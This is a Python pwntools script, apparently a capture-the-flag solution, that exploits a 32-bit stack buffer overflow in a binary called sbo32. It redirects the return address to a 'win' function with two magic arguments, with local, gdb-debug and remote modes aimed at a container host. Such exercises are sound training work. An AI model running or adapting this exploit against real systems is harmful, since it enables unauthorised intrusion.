# usage: python3 ex.py <local?> <with_gdb?>

import os
import sys
from pwn import *

host = "sbo01.westus2.azurecontainer.io"
port = 8080

win_offset = p32(0x08049276)
win_params = [p32(0x1337c0d3), p32(0xacc01ade)]

buffer = ("A"*40 + "BBBB").encode()
ex = buffer + win_offset + "CCCC".encode() + win_params[0] + win_params[1]

# gdb breaks before ret and cmp
# examine sp before ret, examine ebp before cmp
gdb_commands = '''
	break *0x0804931a
	break *0x080492bc
	continue
	x/32x $sp
	continue
	x/32x $ebp
	p $eflags
	ni
	p $eflags
	ni
	ni
	p $eflags
'''

# ------------------------------------------------------------------ #
if len(sys.argv) < 2:
	print("Usage: local (1) or remote (0) exploit.")
	print("Usage: (1) for gdb debug.")
	exit(0)

if sys.argv[1] == "1":
	binary = ELF('./sbo32', checksec=False)
	p = binary.process()

	if len(sys.argv) == 3 and sys.argv[2] == "1":
		gdb.attach(p, gdb_commands)

	print(p.recv().decode())
	p.sendline(ex)
	print(p.recv().decode())

else:
	r = remote(host, port)
	print(r.recv().decode())
	r.sendline(ex)
	print(r.recv().decode())
